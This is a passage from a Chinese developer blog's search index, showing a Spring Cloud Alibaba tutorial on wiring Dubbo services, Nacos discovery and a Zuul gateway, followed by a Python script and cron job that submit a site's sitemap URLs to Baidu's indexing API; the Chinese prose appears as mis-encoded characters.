&lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-nacos.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 1.4ã€åˆ›å»º Service 2 å·¥ç¨‹Service 2 å·¥ç¨‹ çš„ Maven é…ç½®å¦‚ä¸‹ï¼š 1234567891011121314&lt;artifactId&gt;service-2&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;pom&lt;/packaging&gt;&lt;modules&gt; &lt;module&gt;service-2-api&lt;/module&gt; &lt;module&gt;services-2-business&lt;/module&gt;&lt;/modules&gt;&lt;parent&gt; &lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt; 1.4.1ã€åˆ›å»º Service 2 API å·¥ç¨‹Service 2 API å·¥ç¨‹éå¸¸ç®€å•ï¼Œåªè´Ÿè´£å£°æ˜æœåŠ¡æ¥å£ï¼Œæ²¡æœ‰å…·ä½“çš„å®ç°ï¼ŒMaven é…ç½®å¦‚ä¸‹ï¼š 123456789&lt;artifactId&gt;service-2-api&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt; å£°æ˜æœåŠ¡æ¥å£ 123456public interface ProviderService { public String add(Integer a, Integer b); public String sub(Integer a, Integer b);} 1.4.2ã€åˆ›å»º Service 2 Business å·¥ç¨‹å¼•å…¥ service-2-api ä¾èµ–ï¼Œç”±äºéœ€ç”¨ä½¿ç”¨ Dubbo ä¾› service-1 æ¨¡å—è¿›è¡Œè¿œç¨‹è°ƒç”¨ï¼Œå› æ­¤éœ€è¦å¼•å…¥ spring-cloud-starter-dubbo ä¾èµ– 1234567891011121314151617181920212223242526272829&lt;artifactId&gt;services-2-business&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-dubbo&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»ºä¸»å¯åŠ¨ç±»ï¼Œæ·»åŠ  @EnableDiscoveryClient æ³¨è§£ï¼Œå¯ç”¨æœåŠ¡å‘ç°ï¼Œå°†æœåŠ¡æ³¨å†Œåˆ° Nacos Server 12345678@SpringBootApplication@EnableDiscoveryClientpublic class Service2Application { public static void main(String[] args) { SpringApplication.run(Service2Application.class, args); }} åˆ›å»ºå…·ä½“çš„æœåŠ¡æ¥å£å®ç°ç±»ï¼Œæ·»åŠ  @DubboService æ³¨è§£æ ‡è®°æ­¤ç±»çš„æ–¹æ³•æš´éœ²ä¸º Dubbo æ¥å£ 1234567891011121314151617181920/** * ä½¿ç”¨ @DubboService æ³¨è§£æ ‡è®°æ­¤ç±»çš„æ–¹æ³•æš´éœ²ä¸ºDubboæ¥å£ */@DubboServicepublic class ProviderServiceImpl implements ProviderService { private Logger LOG = LoggerFactory.getLogger(ProviderServiceImpl.class); @Override public String add(Integer a, Integer b) { LOG.info("service 2 business invoke"); return String.valueOf(a + b); } @Override public String sub(Integer a, Integer b) { LOG.info("service 2 business invoke"); return String.valueOf(a - b); }} æ·»åŠ  bootstrap.yml é…ç½®æ–‡ä»¶ï¼ŒåŠ å…¥ Dubbo ç›¸å…³çš„é…ç½®å†…å®¹ 1234567891011121314151617181920212223242526272829303132server: port: ${port:56040} servlet: contextâ€path: /service2spring: application: name: service2 cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # å¼€å‘ç¯å¢ƒ cluster-name: DEFAULT config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # å¼€å‘ç¯å¢ƒ group: NACOS_MICRO_SERVICE_GROUP # xxxä¸šåŠ¡ç»„dubbo: scan: base-packages: com.alibaba.micro.study protocol: name: dubbo port: 20891 registry: address: nacos://127.0.0.1:8848 # æ³¨å†Œä¸­å¿ƒåœ°å€ application: qos-enable: false # Dubboè¿ç»´æœåŠ¡æ˜¯å¦å¼€å¯ consumer: check: false # å¯åŠ¨æ—¶å°±å¦æ£€æŸ¥ä¾èµ–çš„æœåŠ¡ 1.5ã€åˆ›å»º Service 1 å·¥ç¨‹Service 1 å·¥ç¨‹ çš„ Maven é…ç½®å¦‚ä¸‹ï¼š 1234567891011121314&lt;artifactId&gt;service-1&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;pom&lt;/packaging&gt;&lt;modules&gt; &lt;module&gt;service-1-api&lt;/module&gt; &lt;module&gt;service-1-business&lt;/module&gt;&lt;/modules&gt;&lt;parent&gt; &lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt; 1.5.1ã€åˆ›å»º Service 1 API å·¥ç¨‹Service 1 API å·¥ç¨‹éå¸¸ç®€å•ï¼Œåªè´Ÿè´£å£°æ˜æœåŠ¡æ¥å£ï¼Œæ²¡æœ‰å…·ä½“çš„å®ç°ï¼ŒMaven é…ç½®å¦‚ä¸‹ï¼š 123456789&lt;artifactId&gt;service-1-api&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-1&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt; å£°æ˜æœåŠ¡æ¥å£ 1234public interface ConsumerService { public String add(Integer a, Integer b);} 1.5.2ã€åˆ›å»º Service 1 Business å·¥ç¨‹å¼•å…¥ service-1-apiã€service-2-api ä¾èµ–ï¼Œç”±äºéœ€ç”¨ä½¿ç”¨ Dubbo è°ƒç”¨ service-2-business çš„æœåŠ¡å®ç°ï¼Œå› æ­¤éœ€è¦å¼•å…¥ spring-cloud-starter-dubbo ä¾èµ– 12345678910111213141516171819202122232425262728293031323334&lt;artifactId&gt;service-1-business&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-1&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-1-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-dubbo&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»ºä¸»å¯åŠ¨ç±»ï¼Œæ·»åŠ  @EnableDiscoveryClient æ³¨è§£ï¼Œå¯ç”¨æœåŠ¡å‘ç°ï¼Œå°†æœåŠ¡æ³¨å†Œåˆ° Nacos Server 12345678@SpringBootApplication@EnableDiscoveryClientpublic class Service1Application { public static void main(String[] args) { SpringApplication.run(Service1Application.class, args); }} åˆ›å»ºå…·ä½“çš„æœåŠ¡æ¥å£å®ç°ç±»ï¼Œæ·»åŠ  @DubboService æ³¨è§£æ ‡è®°æ­¤ç±»çš„æ–¹æ³•æš´éœ²ä¸º Dubbo æ¥å£ï¼ŒåŒæ—¶ä½¿ç”¨ @DubboReference æ³¨è§£ç”Ÿæˆæ¥å£ä»£ç†å¯¹è±¡ï¼Œç„¶åé€šè¿‡ä»£ç†å¯¹è±¡è¿›è¡Œè¿œç¨‹è°ƒç”¨ service-2 çš„æœåŠ¡ 1234567891011121314151617181920/** * ä½¿ç”¨ @DubboService æ³¨è§£æ ‡è®°æ­¤ç±»çš„æ–¹æ³•æš´éœ²ä¸ºDubboæ¥å£ */@DubboServicepublic class ConsumerServiceImpl implements ConsumerService { /** * ç”Ÿæˆæ¥å£ä»£ç†å¯¹è±¡ï¼Œé€šè¿‡ä»£ç†å¯¹è±¡è¿›è¡Œè¿œç¨‹è°ƒç”¨ */ @DubboReference private ProviderService providerService; private Logger LOG = LoggerFactory.getLogger(ConsumerServiceImpl.class); @Override public String add(Integer a, Integer b) { LOG.info("service 1 business invoke"); return providerService.add(a, b); }} æ·»åŠ  bootstrap.yml é…ç½®æ–‡ä»¶ï¼ŒåŠ å…¥ Dubbo ç›¸å…³çš„é…ç½®å†…å®¹ 1234567891011121314151617181920212223242526272829303132server: port: ${port:56030} servlet: contextâ€path: /service1spring: application: name: service1 cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # å¼€å‘ç¯å¢ƒ cluster-name: DEFAULT config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # å¼€å‘ç¯å¢ƒ group: NACOS_MICRO_SERVICE_GROUP # xxxä¸šåŠ¡ç»„dubbo: scan: base-packages: com.alibaba.micro.study protocol: name: dubbo port: 20881 registry: address: nacos://127.0.0.1:8848 # æ³¨å†Œä¸­å¿ƒåœ°å€ application: qos-enable: false # Dubboè¿ç»´æœåŠ¡æ˜¯å¦å¼€å¯ consumer: check: false # å¯åŠ¨æ—¶å°±å¦æ£€æŸ¥ä¾èµ–çš„æœåŠ¡ 1.6ã€åˆ›å»º Application 1 å·¥ç¨‹å¼•å…¥ service-1-apiã€service-2-api ä¾èµ–ï¼Œç”±äºéœ€è¦ä½¿ç”¨ Dubbo è¿›è¡Œè¿œç¨‹è°ƒç”¨ï¼Œå› æ­¤è¿˜éœ€è¦å¼•å…¥ spring-cloud-starter-dubbo ä¾èµ– 12345678910111213141516171819202122232425262728293031323334&lt;artifactId&gt;application-1&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-1-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;artifactId&gt;service-2-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-dubbo&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»ºä¸»å¯åŠ¨ç±»ï¼Œæ·»åŠ  @EnableDiscoveryClient æ³¨è§£ï¼Œå¯ç”¨æœåŠ¡å‘ç°ï¼Œå°†æœåŠ¡æ³¨å†Œåˆ° Nacos Server 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ApplicationBootstrap { public static void main(String[] args) { SpringApplication.run(ApplicationBootstrap.class, args); }} åˆ›å»º Controller æµ‹è¯•ç±»ï¼Œæš´éœ²ä¾›ç¬¬ä¸‰æ–¹è°ƒç”¨çš„ HTTP APIï¼ŒåŒæ—¶ä½¿ç”¨ @DubboReference æ³¨è§£ç”Ÿæˆæ¥å£ä»£ç†å¯¹è±¡ï¼Œç„¶åé€šè¿‡ä»£ç†å¯¹è±¡è¿›è¡Œè¿œç¨‹è°ƒç”¨ service-1ã€service-2 çš„æœåŠ¡ 1234567891011121314151617181920212223242526272829@RestControllerpublic class ApplicationController { /** * ç”Ÿæˆæ¥å£ä»£ç†å¯¹è±¡ï¼Œé€šè¿‡ä»£ç†å¯¹è±¡è¿›è¡Œè¿œç¨‹è°ƒç”¨ */ @DubboReference private ConsumerService consumerService; /** * ç”Ÿæˆæ¥å£ä»£ç†å¯¹è±¡ï¼Œé€šè¿‡ä»£ç†å¯¹è±¡è¿›è¡Œè¿œç¨‹è°ƒç”¨ */ @DubboReference private ProviderService providerService; private Logger LOG = LoggerFactory.getLogger(ApplicationController.class); @GetMapping("/add") public String add(Integer a, Integer b) { LOG.info("application invoke"); return consumerService.add(a, b); } @GetMapping("/sub") public String sub(Integer a, Integer b) { LOG.info("application invoke"); return providerService.sub(a, b); }} æ·»åŠ  bootstrap.yml é…ç½®æ–‡ä»¶ï¼Œç‰¹åˆ«æ³¨æ„ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰å°† appplication-1 çš„ä»»ä½• Dubbo æœåŠ¡æ³¨å†Œåˆ° Nacos Serverï¼Œåªæ˜¯å•çº¯çš„ä½œä¸º Dubbo æœåŠ¡çš„æ¶ˆè´¹è€… 1234567891011121314151617181920212223server: port: ${port:56020} servlet: contextâ€path: /application1spring: application: name: application1 cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # å¼€å‘ç¯å¢ƒ cluster-name: DEFAULT config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # å¼€å‘ç¯å¢ƒ group: NACOS_MICRO_SERVICE_GROUP # xxxä¸šåŠ¡ç»„dubbo: consumer: check: false # å¯åŠ¨æ—¶å°±å¦æ£€æŸ¥ä¾èµ–çš„æœåŠ¡ 1.7ã€åˆ›å»º API ç½‘å…³å·¥ç¨‹å¼•å…¥ Maven ä¾èµ–ï¼Œç”±äºä½¿ç”¨äº† Zuul ä½œä¸ºç½‘å…³æœåŠ¡ï¼Œå› æ­¤éœ€è¦å¼•å…¥ spring-cloud-starter-netflix-zuul ä¾èµ–ï¼ŒåŒæ—¶è¿™é‡ŒæŒ‡å®š Zuul é€šè¿‡ Feign å°†ç¬¬ä¸‰æ–¹çš„ HTTP è¯·æ±‚è½¬å‘ç»™ application-1 æœåŠ¡ï¼Œè¿˜éœ€è¦å¼•å…¥ spring-cloud-starter-openfeign 12345678910111213141516171819202122232425262728&lt;artifactId&gt;api-gateway&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt;&lt;parent&gt; &lt;artifactId&gt;alibaba-micro-service-study&lt;/artifactId&gt; &lt;groupId&gt;com.alibaba.micro.study&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»ºä¸»å¯åŠ¨ç±»ï¼Œæ·»åŠ  @EnableDiscoveryClientã€@EnableZuulProxy 123456789@SpringBootApplication@EnableDiscoveryClient@EnableZuulProxypublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} æ·»åŠ  bootstrap.yml é…ç½®æ–‡ä»¶ï¼Œç”±äºè·¯ç”±çš„æ˜ å°„è§„åˆ™ä¼šç»å¸¸å‘ç”Ÿæ”¹å˜ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å»ºè®®å°†ä¸‹åˆ— Zuul ç›¸å…³çš„é…ç½®å‘å¸ƒåˆ° Nacos Serverï¼ˆé…ç½®ä¸­å¿ƒ + æ³¨å†Œä¸­å¿ƒï¼‰ä¸­ã€‚ä¸ºäº†æ¼”ç¤ºæ–¹ä¾¿ï¼Œè¿™é‡Œç›´æ¥å°† Zuul çš„è·¯ç”±é…ç½®ä¿¡æ¯å†™åœ¨ bootstrap.yml é‡Œã€‚ 12345678910111213141516171819202122232425server: port: ${port:56010} servlet: contextâ€path: /api-gatewayspring: application: name: api-gateway cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # å¼€å‘ç¯å¢ƒ cluster-name: DEFAULT config: server-addr: 127.0.0.1:8848 file-extension: yaml namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 # å¼€å‘ç¯å¢ƒ group: NACOS_MICRO_SERVICE_GROUP # xxxä¸šåŠ¡ç»„zuul: routes: application1: stripPrefix: false path: /application1/** æˆ–è€…å°† Zuul çš„è·¯ç”±è§„åˆ™é…ç½®å‘å¸ƒåˆ° Nacos Serverï¼Œè€Œä¸æ˜¯ç›´æ¥å†™åœ¨ bootstrap.yml é…ç½®æ–‡ä»¶ä¸­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 1.8ã€æµ‹è¯•åº”ç”¨ä»£ç  1ï¼‰åˆ†åˆ«å¯åŠ¨ service-2ã€service-1ã€application-1ã€api-gateway åº”ç”¨ 2ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:56020/application1/sub?a=6&amp;b=2ï¼Œè‹¥å“åº”ç»“æœæ­£ç¡®è¿”å›ï¼Œåˆ™è¯´æ˜ service-2ã€application-1 æœåŠ¡è¿è¡Œæ­£å¸¸ 3ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:56020/application1/add?a=3&amp;b=4ï¼Œè‹¥å“åº”ç»“æœæ­£ç¡®è¿”å›ï¼Œåˆ™è¯´æ˜ service-2ã€service-1ã€application-1 æœåŠ¡è¿è¡Œæ­£å¸¸ 4ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:56010/api-gateway/application1/add?a=3&amp;b=4ï¼Œè‹¥å“åº”ç»“æœæ­£ç¡®è¿”å›ï¼Œåˆ™è¯´æ˜ service-2ã€service-1ã€application-1ã€api-gateway æœåŠ¡è¿è¡Œæ­£å¸¸ Nacos Server çš„æœåŠ¡åˆ—è¡¨å¦‚ä¸‹ï¼š è‹¥å¸Œæœ›æµ‹è¯•å„æœåŠ¡å¤šå®ä¾‹çš„è´Ÿè½½å‡è¡¡è°ƒç”¨æƒ…å†µï¼Œå¯ä»¥é€šè¿‡ -Dport=xxxxx VM å‚æ•°æŒ‡å®šä¸åŒçš„ç«¯å£æ¥å¯åŠ¨å¤šä¸ªæœåŠ¡å®ä¾‹å³å¯ï¼Œè¿™é‡Œä¸å†ç´¯è¿° var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"ç™¾åº¦æœç´¢èµ„æºå¹³å° - ç«™ç‚¹å¤©çº§æ”¶å½•ï¼ˆPython ç‰ˆï¼‰",url:"/posts/3971860d.html",text:'å‰è¨€æ³¨å†Œå¼€é€šç™¾åº¦ç†ŠæŒ ID åï¼ˆè¯¥äº§å“åæ¥æ”¹åä¸ºç§»åŠ¨ä¸“åŒºï¼‰ï¼Œç™¾åº¦æœç´¢èµ„æºå¹³å°æä¾›äº†ç«™ç‚¹å¤©çº§æ”¶å½•çš„ APIï¼Œå¯ä»¥è®©ç«™é•¿äº«å—å¤©çº§æ”¶å½•ç«™ç‚¹çš„æœºä¼šï¼ˆå­˜åœ¨å¤©çº§æ”¶å½•é…é¢é™åˆ¶ï¼‰ï¼Œè¿™æ ·å¯ä»¥å¾ˆå¤§ç¨‹åº¦åœ°åŠ å¿«ç«™ç‚¹çš„æ”¶å½•ã€‚æœ¬æ–‡ä¼šç»™å‡ºç°æˆçš„ Python ç‰ˆæœ¬ç«™ç‚¹å¤©çº§æ”¶å½•ä»£ç ï¼Œç³»ç»Ÿç¯å¢ƒä¾èµ– Linuxï¼Œè½¯ä»¶ç¯å¢ƒä¾èµ– Python3ã€Curlã€‚ Python3 ä»£ç ä»¥ä¸‹ä»£ç ä¼šè¯»å–ç‰¹å®šåŸŸåä¸‹çš„ sitemap ç«™ç‚¹åœ°å›¾æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ Curl å‘½ä»¤å°†ç«™ç‚¹åœ°å›¾æ–‡ä»¶ä¸­åˆæ³• ï¼ˆç»“å°¾ä¸º .htmlï¼‰çš„ URL æ‰¹é‡æäº¤ç»™ç™¾åº¦æœç´¢èµ„æºå¹³å°ï¼Œè¯·è‡ªè¡Œæ›¿æ¢ä»£ç ä¸­çš„ domainã€app_idã€tokenã€site_map_urlã€day_submit_max_lines å˜é‡å€¼ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125# -*- coding: utf-8 -*-import reimport osimport loggingimport subprocessfrom io import StringIOfrom urllib import request# ç«™ç‚¹åŸŸådomain = \'www.example.com\'# æœç´¢èµ„æºå¹³å°ç”³è¯·çš„å”¯ä¸€è¯†åˆ«IDapp_id = \'xxxxxxxxxxxxxxxxx\'# æœç´¢èµ„æºå¹³å°ç”³è¯·çš„æäº¤ç”¨çš„å‡†å…¥å¯†é’¥token = \'xxxxxxxxxxxxxxxxxxxxxx\'# ç«™ç‚¹åœ°å›¾çš„URLsite_map_url = \'https://www.example.com/sitemap.xml\'# æœ€å¤§çš„æäº¤æ•°é‡ï¼ˆå¤©çº§æ”¶å½•é…é¢ï¼‰day_submit_max_lines = 10# æäº¤é“¾æ¥çš„æ¥å£day_submit_url = \'http://data.zz.baidu.com/urls?appid={app_id}&amp;token={token}&amp;type=realtime\'.format(app_id=app_id, token=token)# æäº¤çš„URLé“¾æ¥æ–‡ä»¶day_submit_urls_file = "/tmp/baidu_xiongzhang_day_submit_url.txt"# è®°å½•å†å²æäº¤ä½ç½®çš„ç´¢å¼•æ–‡ä»¶ï¼ˆç´¢å¼•ä»ä¸€å¼€å§‹ï¼‰day_record_file = "/tmp/baidu_xiongzhang_day_record.txt"# æ—¥å¿—æ–‡ä»¶log_file = "/tmp/baidu_xiongzhang_day.log"def regexpMatchUrl(content): pattern = re.findall(r\'(http|https):\\/\\/[\\w\\-_]+(\\.[\\w\\-_]+)+([\\w\\-\\.,@?^=%&amp;amp;:/~\\+#]*[\\w\\-\\@?^=%&amp;amp;/~\\+#])?\', content, re.IGNORECASE) if pattern: return True else: return Falsedef regexpMatchWebSite(content): pattern = re.findall(r\'\'.join(domain), content, re.IGNORECASE) if pattern: return True else: return Falsedef getUrl(content): pattern = re.findall(r\'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+.html\', content, re.IGNORECASE) if pattern: return pattern[0] else: return \'\'def writeRecordFile(record_file_path, content): record_file = open(record_file_path, \'w\') record_file.writelines(content) record_file.close()def readRecordFile(record_file_path): content = "0" if(os.path.exists(record_file_path)): record_file = open(record_file_path, \'r\') content = record_file.readline() record_file.close() if(len(content) == 0): content = "0" return contentdef countWebsiteMapUrl(): total = 0 content = request.urlopen(site_map_url).read().decode(\'utf8\') website_map_file = StringIO(content) for line in website_map_file: if(regexpMatchUrl(line) and regexpMatchWebSite(line)): total = total + 1 website_map_file.close() return totaldef createUrlFile(url_file_path, max_lines): old_index = readRecordFile(day_record_file) content = request.urlopen(site_map_url).read().decode(\'utf8\') website_map_file = StringIO(content) url_file = open(url_file_path, \'w\') # write url file index = 0 number = 0 for line in website_map_file: if(regexpMatchUrl(line) and regexpMatchWebSite(line)): if(index &lt; int(old_index)): index = index + 1 continue url = getUrl(line) if(url != \'\'): index = index + 1 number = number + 1 url_file.writelines(url + "\\n") if(number &gt;= max_lines): break # update record file if(index == countWebsiteMapUrl()): writeRecordFile(day_record_file, str(0)) else: writeRecordFile(day_record_file, str(index)) # close file url_file.close() website_map_file.close()def submitUrlFile(url, url_file_path, log_file): shell_cmd_line = "curl -H \'Content-Type:text/plain\' --data-binary @" + url_file_path + " " + \'\\"\' + url + \'\\"\' (status, output) = subprocess.getstatusoutput(shell_cmd_line) logging.info(output + "\\n") # print(shell_cmd_line)if __name__ == "__main__": logging.basicConfig(level=logging.INFO, format=\'%(asctime)s - %(name)s - %(levelname)s - %(message)s\', filename=log_file) createUrlFile(day_submit_urls_file, day_submit_max_lines) submitUrlFile(day_submit_url, day_submit_urls_file, log_file) Crontab å®šæ—¶ä»»åŠ¡Linux ç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œé…åˆ Python è„šæœ¬ + Crontab å®šæ—¶ä»»åŠ¡ï¼Œå³å¯å®šæ—¶ä¸»åŠ¨æäº¤é“¾æ¥åˆ°ç™¾åº¦æœç´¢èµ„æºå¹³å°ã€‚ 12# æ¯å¤©å‡Œæ™¨ä¸‰ç‚¹ä¸»åŠ¨æäº¤ä¸€æ¬¡é“¾æ¥0 3 * * * /usr/bin/python3 /usr/local/baidu-push/baidu_xiongzhang_day.py è„šæœ¬è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯12345678$ cat /tmp/baidu_xiongzhang_day.log2020-01-19 21:46:08,072 - www - INFO - % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0100 507 100 67 100 440 555 3648 --:--:-- --:--:-- --:--:-- 3666{"remain":5,"success":10,"success_realtime":10,"remain_realtime":5} Docker ä¸€é”®éƒ¨ç½²æ”¶å½•æœåŠ¡ Dockerfile 